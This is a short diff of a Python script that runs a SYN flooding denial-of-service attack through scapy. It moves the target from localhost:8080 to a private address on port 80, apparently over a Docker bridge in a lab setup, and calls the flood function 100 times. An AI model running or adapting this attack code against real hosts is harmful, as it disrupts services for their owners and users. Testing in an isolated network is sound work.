@@ -35,10 +35,9 @@ def syn_flood(target_ip, target_port, interface="lo"):
     send(syn_packet,iface=interface, verbose=1)
 
 if __name__ == "__main__":
-    target_ip = "127.0.0.1"
-    target_port = 8080
+    target_ip = "172.20.0.2"
+    target_port = 80
     interface_name = get_interface_name(target_ip, target_port)
-    print("iface:",interface_name)
-    print(f"Initiating SYN flooding attack on {target_ip}:{target_port}...")
+    print(f"Initiating SYN flooding attack on {target_ip}:{target_port}:{interface_name}...")
     for i in range(100):
         syn_flood(target_ip, target_port, "br-52e02f2c4612")
